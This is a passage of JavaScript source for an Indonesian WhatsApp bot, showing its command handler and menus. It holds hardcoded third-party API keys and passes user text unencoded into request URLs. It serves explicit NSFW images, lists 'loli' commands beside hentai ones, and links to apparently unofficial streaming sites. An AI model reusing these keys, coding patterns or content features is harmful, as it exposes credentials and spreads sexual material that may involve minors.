  buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/joke?url=${data.display_url}&apikey=IkyOgiwara`)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
} else {
  reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}joke`)
}
break
case 'chiisaihentai':
case 'trap':
case 'blowjob':
case 'yaoi':
case 'ecchi':
case 'ahegao':
case 'hololewd':
case 'sideoppai':
case 'animefeets':
case 'animebooty':
case 'animethighss':
case 'hentaiparadise':
case 'animearmpits':
case 'hentaifemdom':
case 'lewdanimegirls':
case 'biganimetiddies':
case 'animebellybutton':
case 'hentai4everyone':
reply (mess.wait)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=Mythia-Chan`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
contentText:`©Kahfz bot`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)


break
case 'bj':
case 'ero':
case 'cum':
case 'feet':
case 'yuri':
case 'trap':
case 'lewd':
case 'feed':
case 'eron':
case 'solo':
case 'gasm':
case 'poke':
case 'anal':
case 'holo':
case 'tits':
case 'kuni':
case 'kiss':
case 'erok':
case 'smug':
case 'baka':
case 'solog':
case 'feetg':
case 'lewdk':
case 'waifu':
case 'pussy':
case 'femdom':
case 'cuddle':
case 'hentai':
case 'eroyuri':
case 'cum_jpg':
case 'blowjob':
case 'erofeet':
case 'holoero':
case 'classic':
case 'erokemo':
case 'fox_girl':
case 'futanari':
case 'lewdkemo':
case 'wallpaper':
case 'pussy_jpg':
case 'kemonomimi':
case 'nsfw_avatar':
reply (mess.wait)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=Mythia-Chan`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
contentText:`©Kahfz bot`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)

break


case 'ppcp':
case 'ppcouple':

anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=IkyOgiwara`)
buff1 = await getBuffer(anu.result.male)
buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©WhatsApp bot`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff1, "imageMessage", { thumbnail: buff1, })).imageMessage
buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
contentText:`Cowo`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)
buff2 = await getBuffer(anu.result.female)
buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©WhatsApp bot`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff2, "imageMessage", { thumbnail: buff2, })).imageMessage
buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
contentText:`Cewe`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
setTimeout( async () => {
 kahfzz.relayWAMessage(prep)
  }, 5000)
break

case 'meme':
case 'memek':

buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=IkyOgiwara')

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)

break
 // Textprome //
 case 'blackpink':
 case 'neon':
 case 'greenneon':
 case 'advanceglow':
 case 'futureneon':
 case 'sandwriting':
 case 'sandsummer':
 case 'sandengraved':
 case 'metaldark':
 case 'neonlight':
 case 'holographic':
 case 'text1917':
 case 'minion':
 case 'deluxesilver':
 case 'newyearcard':
 case 'bloodfrosted':
 case 'halloween':
 case 'jokerlogo':
 case 'fireworksparkle':
 case 'natureleaves':
 case 'bokeh':
 case 'toxic':
 case 'strawberry':
 case 'box3d':
 case 'roadwarning':
 case 'breakwall':
 case 'icecold':
 case 'luxury':
 case 'cloud':
 case 'summersand':
 case 'horrorblood':
 case 'thunder':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=Mythia-Chan&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)

 break
 case 'pornhub':
 case 'glitch':
 case 'avenger':
 case 'space':
 case 'ninjalogo':
 case 'marvelstudio':
 case 'lionlogo':
 case 'wolflogo':
 case 'steel3d':
 case 'wallgravity':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
txt1 = args[0]
 txt2 = args[1]
 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=Mythia-Chan&text1=${txt1}&text2=${txt2}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)

 break

 // Photo Oxy //
 case 'shadow':
 case 'cup':
 case 'cup1':
 case 'romance':
 case 'smoke':
 case 'burnpaper':
 case 'lovemessage':
 case 'undergrass':
 case 'love':
 case 'coffe':
 case 'woodheart':
 case 'woodenboard':
 case 'summer3d':
 case 'wolfmetal':
 case 'nature3d':
 case 'underwater':
 case 'golderrose':
 case 'summernature':
 case 'letterleaves':
 case 'glowingneon':
 case 'fallleaves':
 case 'flamming':
 case 'harrypotter':
 case 'carvedwood':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=Mythia-Chan&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'© Kahfz Bot', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)

 break
 case 'ttlogo':
 case 'arcade8bit':
 case 'battlefield4':
 case 'pubg':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
txt1 = args[0]
 txt2 = args[1]
 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=IkyChan&text1=${txt1}&text2=${txt2}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'Kahfz Bot', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)

 break

 // Ephoto 360 //
 case 'wetglass':
 case 'multicolor3d':
 case 'watercolor':
 case 'luxurygold':
 case 'galaxywallpaper':
 case 'lighttext':
 case 'beautifulflower':
 case 'puppycute':
 case 'royaltext':
 case 'heartshaped':
 case 'birthdaycake':
 case 'galaxystyle':
 case 'hologram3d':
 case 'greenneon':
 case 'glossychrome':
 case 'greenbush':
 case 'metallogo':
 case 'noeltext':
 case 'glittergold':
 case 'textcake':
 case 'starsnight':
 case 'wooden3d':
 case 'textbyname':
 case 'writegalacy':
 case 'galaxybat':
 case 'snow3d':
 case 'birthdayday':
 case 'goldplaybutton':
 case 'silverplaybutton':
 case 'freefire':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=IkyChan&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
 contentText:`©WhatsApp bot`,buttons,headerType:4}
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)

 break
 case 'setwelcome':

 if (args.length < 1) return reply('*Teks nya mana gan?*')
kahfzz.updatePresence(from, Presence.composing) 
 if (args.length < 1) return
  join = body.slice(11)
kahfzz.sendMessage(from ,`\`\`\`Welcome berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : freply})
break 

case 'public':
if (!kahfz.key.fromMe) return 
 if (banChats === true) return 
banChats = false
 textImg(`Sukses mode publik gan`)
 break
 case "set":
 case 'mode':
 case 'ubah':
 if (!kahfz.key.fromMe) return;
 sendButMessage(from, `SELF OR PUBLIC`, `Silahkan pilih salah satu`, [
 {
buttonId: `${prefix}self`,
buttonText: {
  displayText: `⬡ SELF `,
},
type: 1,
 },
 {
buttonId: `${prefix}public`,
buttonText: {
  displayText: `⬡ PUBLIC`,
},
type: 1,
 },
 ]);
 break;
 case "example":
 case "contoh":
 sendButMessage(from, `Please select the language you use`, `Choose a language below`, [
 {
buttonId: `${prefix}exampleid`,
buttonText: {
  displayText: `⬡ INDONESIA `,
},
type: 1,
 },
 {
buttonId: `${prefix}exampleen`,
buttonText: {
  displayText: `⬡ ENGLISH`,
},
type: 1,
 },
 ]);
 break;
 case 'self':
 if (!kahfz.key.fromMe) return 
if (banChats === false) return
 uptime = process.uptime()
  banChats = false
  textImg(`Success mode self gan`)
  break
  case 'quotes':
  quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=IkyChan`)
  quotes = quotes.result
  author = quotes.by
  quotes = quotes.quote
  reply(`_${quotes}_\n\n*â€• ${author}*`)
  break
  case 'quotesanime':
  quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=Mythia-Chan`)
  quotes = quotes.result
  quote = quotes.quote
  char = quotes.character
  anime = quotes.anime
  episode = quotes.episode
  reply(`_${quote}_\n\n*• ${char}*\n*• ${anime} ${episode}*`)
  break
  case 'quotesdilan':
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=Mythia-Chan`)
  reply(get_result.result)

  break
  break
  case 'quotesimage':
  buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=Mythia-Chan`)
  buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
  contentText: ini_txt,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
  case 'faktaunik':
  case 'katabijak':
  case 'pantun':
  case 'bucin':
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=Mythia-Chan`)
  titid = get_result.result
  sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
  {
buttonId: `${prefix + command}`,
buttonText: {
  displayText: `⬡ NEXT `,
},
type: 1,
 },]);
  break;
  case 'debug':
			 res = await kahfzz.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n ${week}- ${weton} `,
							"hydratedFooterText": `${botName}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								},
								{
									"quickReplyButton": {
										"displayText": "Allmenu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 3
								},
								{
									"quickReplyButton": {
										"displayText": "youtube",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 4
								}
							]
						}
					}
				}, {}) 
kahfzz.relayWAMessage(res)
  break
  case 'randomnama':
  anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=IkyChan`)
  kahfzi = anu.result
  sendButMessage(from, kahfzi, `Klik Untuk Ke Nama Selanjutnya`, [
  {
buttonId: `${prefix + command}`,
buttonText: {
  displayText: `⬡ NEXT `,
},
type: 1,
 },]);
  break;
  break
 // Movie & Story
 case 'lk21':
 if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
  query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=Mythia-Chan&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Link : ${get_result.link}\n`
ini_txt += `Genre : ${get_result.genre}\n`
ini_txt += `Views : ${get_result.views}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Tahun : ${get_result.tahun}\n`
ini_txt += `Rating : ${get_result.rating}\n`
ini_txt += `Desc : ${get_result.desc}\n`
ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
ini_txt += `Location : ${get_result.location}\n`
ini_txt += `Date Release : ${get_result.date_release}\n`
ini_txt += `Language : ${get_result.Language}\n`
ini_txt += `Link Download : ${get_result.link_dl}`
thumbnail = await getBuffer(get_result.thumbnail)
await kahfzz.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
break
case 'drakorongoing':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = "Ongoing Drakor\n\n"
for (var x of get_result) {
  ini_txt += `Title : ${x.title}\n`
  ini_txt += `Link : ${x.link}\n`
  ini_txt += `Thumbnail : ${x.thumbnail}\n`
  ini_txt += `Year : ${x.category}\n`
  ini_txt += `Total Episode : ${x.total_episode}\n`
  ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
}
reply(ini_txt)
break
case 'wattpad':
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)
  ini_url = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=Mythia-Chan&url=${ini_url}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Rating : ${get_result.rating}\n`
ini_txt += `Motify date : ${get_result.modifyDate}\n`
ini_txt += `Create date: ${get_result.createDate}\n`
ini_txt += `Word : ${get_result.word}\n`
ini_txt += `Comment : ${get_result.comment}\n`
ini_txt += `Vote : ${get_result.vote}\n`
ini_txt += `Reader : ${get_result.reader}\n`
ini_txt += `Pages : ${get_result.pages}\n`
ini_txt += `Description : ${get_result.desc}\n\n`
ini_txt += `Story : \n${get_result.story}`
thumbnail = await getBuffer(get_result.photo)
await kahfzz.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
break
case 'wattpadsearch':
if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
  query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=Mythia-Chan&query=${query}`)
get_result = get_result.result
ini_txt = "Wattpad Seach : \n"
for (var x of get_result) {
  ini_txt += `Title : ${x.title}\n`
  ini_txt += `Url : ${x.url}\n`
  ini_txt += `Part : ${x.parts}\n`
  ini_txt += `Motify date : ${x.modifyDate}\n`
  ini_txt += `Create date: ${x.createDate}\n`
  ini_txt += `Coment count: ${x.commentCount}\n\n`
}
reply(ini_txt)
break
case 'cerpen':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Creator : ${get_result.creator}\n`
ini_txt += `Story :\n${get_result.cerpen}`
titid = ini_txt
sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
{
  buttonId: `${prefix + command}`,
  buttonText: {
 displayText: `⬡ NEXT `,
  },
  type: 1,
},]);
break;
break
case 'ceritahoror':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=IkyChan`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Desc : ${get_result.desc}\n`
ini_txt += `Story :\n${get_result.story}\n`
buff = await getBuffer(get_result.thumbnail)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
contentText: ini_txt,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)
break

case 'grupmenu':
case 'groupmenu':
case 'menugroup':
case 'menugrup':

wibu = `${botName}



  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ
▹  ᴀꜰᴋ *ᴀʟᴀꜱᴀɴ*
▹  ᴄᴇᴋꜱᴇᴡᴀ
▹  ᴋɪᴄᴋᴀʟʟ
▹  ɪɴꜰᴏɢʀᴜᴘ
▹  ᴘʀᴏᴍᴏᴛᴇ
▹  ᴅᴇᴍᴏᴛᴇ
▹  ʟɪꜱᴛᴏɴʟɪɴᴇ
▹  ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*
▹  voting *!voting @tag | alasan | 1-100 menit
▹  delvote *hapus sesi vote di grup*
▹  ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*
▹  ʟᴇᴀᴠᴇ
▹  ᴋɪᴄᴋ *ʀᴇᴘʟʏ*
▹  ᴀᴅᴅ *+62xxxxxx*
▹  ꜱᴇᴛɢʀᴜᴘɴᴀᴍᴇ
▹  ꜱᴇᴛᴘᴘɢʀᴜᴘ
▹  ꜱᴇᴛᴅᴇꜱᴄ
▹  antidel *enable/disable*
▹  antiviewonce *enable/disable*
▹  ꜱɪᴅᴇʀ *ʀᴇᴘʟʏ ᴄʜᴀᴛ ʙᴏᴛ*
▹  ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋꜱ/ʀᴇᴘʟʏ ᴛᴇᴋꜱ*
`
sendButMessage(from, wibu, `created follow @kahfzz_ads`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;
case 'storymenu':
case 'moviemenu':
case 'menumovie':

wibu = `${botName}


  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹ ${prefix}drakorongoing
▹ ${prefix}lk21 query
▹ ${prefix}wattpad url_wattpad
▹ ${prefix}wattpadsearch query
▹ ${prefix}cerpen
▹ ${prefix}ceritahoror`
sendButMessage(from, wibu, `created follow @kahfzz_ads`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'randomtext':


wibu =`  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍U
▹ ${prefix}quotes
▹ ${prefix}quotesdiLan
▹ ${prefix}quotesanime
▹ ${prefix}quotesimage
▹ ${prefix}faktaunik
▹ ${prefix}katabijak
▹ ${prefix}pantun
▹ ${prefix}bucin
▹ ${prefix}randomnama`
sendButMessage(from, wibu, `created follow @kahfzz_ads`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'ownermenu':
case  'menuowner':

wibu =`
 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}bc *teks*
▹  ${prefix}term
▹  ${prefix}self
▹  ${prefix}public
▹  ${prefix}eval
▹  ${prefix}reset
▹  ${prefix}clearall
▹  ${prefix}leaveall
▹  ${prefix}addvn
▹  ${prefix}getvn
▹  ${prefix}addimage
▹  ${prefix}getimage
▹  ${prefix}addvideo
▹  ${prefix}getvideo
▹  ${prefix}slow
▹  ${prefix}leaveall
▹  ${prefix}join *link gc*
▹  ${prefix}shutdown
▹  ${prefix}getquoted
▹  ${prefix}addupdate *fiturnya*
▹  ${prefix}exif *nama|author*
▹  ${prefix}sewa add/del *waktunya*
▹  ${prefix}premium add @tag|nomor
▹  ${prefix}premium del @tag|nomor
`

sendButMessage(from, wibu, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;
case 'wibumenu':
case  'menuwibu':
wibu =`${botName}


 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}loli
▹  ${prefix}manga
▹  ${prefix}anime 
▹  ${prefix}lolivideo
▹  ${prefix}husbu
▹  ${prefix}waifu
▹  ${prefix}milf
▹  ${prefix}neko
▹  ${prefix}kanna
▹  ${prefix}sagiri
▹  ${prefix}hentai
▹  ${prefix}cosplay
▹  ${prefix}wallnime
▹  ${prefix}kusonime
▹  ${prefix}megumin
▹  ${prefix}otakudesu
▹  ${prefix}doujindesu
▹  ${prefix}storyanime
▹  ${prefix}nakanomiku
▹  ${prefix}nakanokahfzz
▹  ${prefix}nakanoitsuki
▹  ${prefix}otakuongoing
▹  ${prefix}nhentai *code*
▹  ${prefix}nekopoi *link*
▹  ${prefix}nekopoisearch
▹  ${prefix}aotfilm
`

sendButMessage(from, wibu, `created Kahfz Bot`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'aotfilm':
wibu = `
┏ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇          *「 Only Attack On Titan 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Season I 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-subtitle-indonesia/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Season II 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-season-2/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Season III 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-season-3/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin The Final Season 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-the-final-season/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Chuugakkou 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://animasu.net/anime/shingeki-kyojin-chuugakkou/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin : Kuinaki Sentaku (OVA) 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-kuinaki-sentaku/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin : OVA 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-ova/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin : Lost Girl 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-lost-girls/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin : Chronicle 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-chronicle/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Movie I : Guren no Yumiya 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-movie-1-guren-no-yumiya/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Shingeki no Kyojin Movie II : Jiyuu no Tsubasa 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://gomunime.online/anime/shingeki-no-kyojin-movie-2-jiyuu-no-tsubasa/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Manga Shingeki no Kyojin 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://komikindo.co/manga/shingeki-no-kyojin/
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┇ *「 Manga Shingeki no Kyojin : Before The Fall 」*
┣ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
┃ ~ https://komikindo.co/manga/shingeki-no-kyojin-before-the-fall/
┗ ┅ ━━━━━━━━━━━━━━━━━━━━ ┅ ━
`
sendButMessage(from, wibu, `Wibu Cek😎`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'downloadmenu':
case  'menudownload':
wibu =`
 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}fb 
▹  ${prefix}igdl 
▹  ${prefix}igdl2 
▹  ${prefix}twitter 
▹  ${prefix}tiktok 
▹  ${prefix}play 
▹  ${prefix}ythd 
▹  ${prefix}ytmp3 
▹  ${prefix}ytmp4 
▹  ${prefix}soundcloud 
▹  ${prefix}tiktoknowm 
▹  ${prefix}tiktokaudio
▹  ${prefix}mediafire 
▹  ${prefix}nhentaipdf *code* `

sendButMessage(from, wibu, `created Kahfz Bot`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'othermenu':
case  'menuother':
wibu =` 𝐋𝐈𝐒𝐓 𝐌𝐄????
▹  ${prefix}brainly *query*
▹  ${prefix}shopee *product*
▹  ${prefix}playstore *query*
▹  ${prefix}ssweb *query*
▹  ${prefix}google *query*
▹  ${prefix}image *query*
▹  ${prefix}pinterest *query*
▹  ${prefix}nulis *teks*
▹  ${prefix}iguser *ussername*
▹  ${prefix}igstalk *username*
▹  ${prefix}githubstalk *username*
▹  ${prefix}tiktokstalk *ussername*
▹  ${prefix}img2url *reply foto*
▹  ${prefix}ytsearch *query*
▹${prefix}nomornegara
`

sendButMessage(from, wibu, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;

case 'gamemenu':
case  'menugame':
wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}slot
▹  ${prefix}voting
▹  ${prefix}limitgame
▹  ${prefix}gelud @tag
▹  ${prefix}tictactoe @tag
▹  ${prefix}siapaaku
▹  ${prefix}family100
▹  ${prefix}kuismath
▹  ${prefix}asahotak
▹  ${prefix}tebaklirik
▹  ${prefix}tebaklagu
▹  ${prefix}tebakkata
▹  ${prefix}susunkata
▹  ${prefix}kimiakuis
▹  ${prefix}caklontong
▹  ${prefix}tebakjenaka
▹  ${prefix}tebakanime
▹  ${prefix}tebaktebakan
▹  ${prefix}tebakgambar
▹  ${prefix}tebakbendera
